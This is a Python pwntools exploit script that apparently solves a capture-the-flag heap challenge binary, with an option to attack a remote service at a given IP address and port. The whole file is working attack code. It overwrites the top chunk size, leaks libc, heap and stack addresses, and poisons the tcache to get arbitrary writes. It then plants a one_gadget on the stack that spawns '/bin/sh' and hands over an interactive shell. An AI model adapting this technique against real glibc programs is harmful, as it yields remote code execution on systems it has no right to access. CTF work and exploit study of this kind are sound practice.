#!/usr/bin/env python3
# Local Ubuntu 24.04

from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = "./chall"
elf  = ELF(BINARY, checksec=False)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "34.162.33.160"
  PORT = 5000
  s = remote(HOST, PORT)
  libc = ELF("./libc.so.6", checksec=False)
else:
  s = process(BINARY)
  libc = elf.libc

def New(idx, size):
  s.sendlineafter(b"> ", b"1")
  s.sendlineafter(b": ", str(idx).encode())
  s.sendlineafter(b": ", str(size).encode())

def Set(idx, key, value):
  s.sendlineafter(b"> ", b"2")
  s.sendlineafter(b": ", str(idx).encode())
  s.sendlineafter(b": ", str(key).encode())
  s.sendafter(b": ", value)

def Get(idx, key):
  s.sendlineafter(b"> ", b"3")
  s.sendlineafter(b": ", str(idx).encode())
  s.sendlineafter(b": ", str(key).encode())

def Exit():
  s.sendlineafter(b"> ", b"4")

# Change top chunk size 0x20d41 => 0xd41
New(0, 3)
Set(0, 3, b"A"*8)
Set(0, 1, b"B"*8)
Set(0, 2, b"C"*8)
Set(0, 0, p64(0xd41))

# make unsortedbin
New(1, 0xd41//0xc)

# libc leak
New(2, 3)
Set(2, 3, b"A"*8)
Set(2, 6, b"B"*8)
Set(2, 9, b"C"*8)
New(3, 4)
Set(3, 3, b"A"*8)
Set(3, 2, b"B"*8)
Get(3, 0)
s.recvuntil(b"Value: ")
libc_leak = u64(s.recvn(6)+b"\x00\x00")
libc_base = libc_leak - 0x203b20
print("libc_leak =", hex(libc_leak))
print("libc_base =", hex(libc_base))

# make 0x230 size tcachebin #1 
New(4, 0xca0//0xc)

New(5, 4)
Set(5, 4, b"A"*8)
Set(5, 1, b"B"*8)
Set(5, 2, b"C"*8)
Set(5, 3, b"D"*8)
New(6, 3)
Set(6, 3, b"A"*8)
Set(6, 6, b"B"*8)
Set(6, 9, b"C"*8)
Set(6, 0, p64(0x251))
New(7, 0xd41//0xc)

# heap leak
Set(6, 0, p64(0x500000251))
Get(5, 5)
s.recvuntil(b"Value: ")
heap_leak = u64(s.recvn(5)+b"\x00"*3)
print("heap_leak =", hex(heap_leak))

# make 0x230 size tcachebin #2
New(8, 4)
Set(8, 4, b"A"*8)
Set(8, 1, b"B"*8)
Set(8, 2, b"C"*8)
Set(8, 3, b"D"*8)
New(9, 3)
Set(9, 3, b"A"*8)
Set(9, 6, b"B"*8)
Set(9, 9, b"C"*8)
Set(9, 0, p64(0x251))
New(10, 0xd41//0xc)

# tcache poisoning
tcache_addr = ((heap_leak-0x21)<<12)+0x10
Set(9, 0, p64(0x500000251))
Set(8, 5, p64((tcache_addr) ^ (heap_leak+0x22)))
New(11, (0x231-0x10)//0xc)
New(12, (0x231-0x10)//0xc)

# write environ address in tcache directly
environ_addr = libc_base + libc.sym.environ
Set(12, 0, p64(0x1111111111111111))
Set(12, 13, p64(environ_addr-0x28))

# stack leak
New(13, 7)
Set(13, 7, b"A"*8)
Set(13, 1, b"B"*8)
Set(13, 2, b"C"*8)
Get(13, 0)
s.recvuntil(b"Value: ")
stack_leak = u64(s.recvn(6)+b"\x00"*2)
print("stack_leak =", hex(stack_leak))

# write null in stack for one_gadget
Set(12, 1, p64(0x1111111111111111))
Set(12, 17, p64(stack_leak-0x18))  # for one_gadget
New(14, 15)

# write one gadget in stack
one_gadget = libc_base + 0x583dc #posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
Set(12, 2, p64(0x1111111111111111))
Set(12, 21, p64(stack_leak-0x1e8))
New(15, 23)
Set(15, 0, b"A"*8)
Set(15, 32767, p64(one_gadget))

# start one gadget
Exit()

s.interactive() 
